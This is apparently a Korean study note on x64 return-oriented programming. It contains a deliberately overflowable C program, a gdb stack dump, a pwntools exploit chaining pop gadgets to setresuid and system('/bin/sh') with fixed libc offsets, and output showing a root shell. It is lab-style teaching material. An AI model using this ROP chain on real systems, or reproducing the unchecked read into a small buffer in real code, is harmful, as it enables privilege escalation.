---
title: Return-Oriented Programming - x64
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-oriented programming]
math: true
mermaid: true
---


# Description

x64의 경우 호출 규약 때문에 피연산자가 매우 중요하다.

### x64의 ROP에서 POP 명령의 역할

ESP의 레지스터 값을 증가시켜 함수를 연속적으로 호출한다. 호출할 함수에 전달될 인자 값을 레지스터에 저장한다. * 호출할 함수의 1 번째 인자 값 저장: "pop rdi; ret"
* 호출할 함수의 2 번째 인자 값 저장: "pop rsi; ret"
* 호출할 함수의 1,3 번째 인자 값 저장: "pop rdi; pop rdx; ret"

## Proof of concept

```c
// gcc rop.c -o rop -ldl -fno-stack-protector 
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
 
void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 256);
}
 
void main(){
    seteuid(getuid());
    write(1,"Hello ROP\n",10);
    vuln();
}
```

"A"*72 입력 시 overflow 발생한다.

```
gdb-peda$ x/24gx $rbp
0x7fffffffe3c0: 0x4141414141414141  0x000000000040070a
0x7fffffffe3d0: 0x00000000004007e0  0x00007ffff7829830
0x7fffffffe3e0: 0x0000000000000000  0x00007fffffffe4b8
```

## Exploit code

```python
# Exploit Code
import sys
from pwn import *

p = process('./rop')
#gdb.attach(p)
print(p.recvline())
printf_addr = int(p.recvline().split(' ')[3],16)
print('printf_addr: '+str(printf_addr))

libBase = printf_addr - 0x55800
system = libBase + 0x45390
setresuid = libBase + 0xcd570
binsh = libBase + 0x18cd57
pop_rdi_ret = 0x00400843
pop_rsi_ret = 0x00400841
pop_rdx_pop_rsi_ret_offset = 0x1150c9

payload = "A"*72
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(libBase + pop_rdx_pop_rsi_ret_offset)
payload += p64(0)
payload += p64(0)
payload += p64(setresuid)
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

## Exploit

```
pwner@bs-virtual-machine:~$ python exploit.py 
[+] Starting local process './rop': pid 3166
Hello ROP

printf_addr: 140605686425600
[*] Switching to interactive mode
$ id
uid=0(root) gid=1001(pwner) groups=1001(pwner)
```

## Refereces
- [02.ROP(Return Oriented Programming)-x64](https://lazenca.net/display/TEC/02.ROP%28Return+Oriented+Programming%29-x64)